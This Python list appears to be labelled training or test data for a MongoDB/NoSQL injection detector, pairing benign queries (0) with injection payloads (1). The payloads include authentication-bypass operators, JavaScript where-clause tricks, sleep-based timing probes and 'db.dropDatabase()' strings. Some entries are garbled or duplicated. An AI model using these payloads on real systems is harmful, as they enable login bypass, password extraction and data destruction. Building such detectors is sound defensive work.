query = [('{"user": "{}", "password": "{}"}', 0), ('{"username": {"regex": "^{}"}}', 1), ('{"username": {"ne": "{}"}}', 1), ('{"username": {"gt": "{}"}}', 1), ('{"user": "hacker", "password": {"ne": ""}}', 1), ('{"user": req.query.user, "password": req.query.password}', 0), ('{"user": "hacker", "password": {"&ne": ""}}', 1), ('{"user": req.params['user'], "password": req.params['password']}', 0), ('{"user": request.GET['user'], "password": request.GET['password']}', 0), ('{"user": req.query.user_id, "password": req.query.user_pass}',0), ('{"user": req.params['user_id'], "password": req.params['user_pass']}',0), ('db.users.find({"user": "user123", "email": "user123@example.com"})',0), ('db.users.find({"user": request.GET['user'], "password": request.GET['password']})', 0), ('db['users'].find({:user => req.params['user'], :password => req.params['password']})', 0), ('db.collection('users').find({"user": "hacker", "password": {"&ne": ""}})', 1), ('}); db.dropDatabase(); db.insert({username: ‘dummy ’, password: ‘dummy’', 1), ('{"username": {"eq": "admin"}, "password": {"regex": "^md" }}', 0), ('login[nin][]=admin&login[nin][]=test&pass[ne]=toto′,1),("login(′"type":"user","name":"oops","roles":["admin"],"roles":[],"password":"apple"′,1),(′true,where: '1 == 1'', 1), ('{"where": "this.username === \'{}\'"}', 1), ('{"or": [{"username": "{}"}, {"isAdmin": true}]}', 1), ('{ "or":[,"a":"a′,1),("′],comment:'successful MongoDB injection'", 1), ('{"user": "alice", "password": "123456"}', 0), ('{"username": {"regex": "^test"}}', 0), ('{"username": {"ne": "testuser"}}', 0), ('{"username": {"gt": "guest"}}', 0), ('{"user": "john", "password": "qwerty"}', 0), ('{"user": req.query.name, "password": req.query.pass}', 0), ('{"user": req.params[\'name\'], "password": req.params[\'pass\']}', 0), ('{"user": request.GET[\'name\'], "password": request.GET[\'pass\']}', 0), ('db.users.find({"user": "john", "age": {"gt": 25}})', 0), ('db.users.find({"user": "user", "age": {"gt": 30}})',0), ('db.users.find({"user": request.GET[\'name\'], "password": request.GET[\'pass\']})', 0), ('db[\'users\'].find({:user => req.params[\'name\'], :password => req.params[\'pass\']})', 0), ("' && this.password.match(/.*/)//+%00", 1), ("' && this.passwordzz.match(/.*/)//+%00", 1), ("';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);",1), ("';sleep(5000);",1), ("0;return true;var%20password%20=%20this.password.match(/.*/);",1), ("0;return true",1), ("|| 1==1",1), ("db.injection.insert({success:1});",1), ("|| sleep(5)",1), ('%27%3B%20return%20%27%27%20==%20%27', 1), ("login%5B%24gt%5D=admin&login%5B%24lt%5D=test&pass%5B%24ne%5D=1",1), ('%27%20&&%20this.password.match%28%2F.%2A%2F%29%2F%2F%2B%2500', 1), ("db.injection.insert({success:1});",1), ("|| sleep(5)",1), ("|| 1==1",1), ("0;return true;var%20password%20=%20this.password.match(/.*/);",1), ("0;return true",1), ("';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);",1), ("';sleep(5000);",1), ("|| this.password.match(/.*/)//+%00", 1), ("' && this.password.match(/.*/)//+%00", 1), ("' && this.passwordzz.match(/.*/)//+%00", 1), ("';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);",1), ("';sleep(5000);",1), ("0;return true;var%20password%20=%20this.password.match(/.*/);",1), ("true, where: '1 == 1'",1), ("where: '1 == 1'",1), ("db.collection('users').find({:user => req.params['user'], :password => req.params['password']})",0), ("this.hidden == false && this.category == ''; return '' == ''",0), (r"}); db.dropDatabase();", 1), #r is for raw string ('{"category": "electronics"}', 0), ('{"category": "electronics", "price": {"gt": 200}}', 0), ('{"category": "electronics", "price": {"gt": 200}, "name": {"regex": "^S"}}', 0), ('{}', 0),]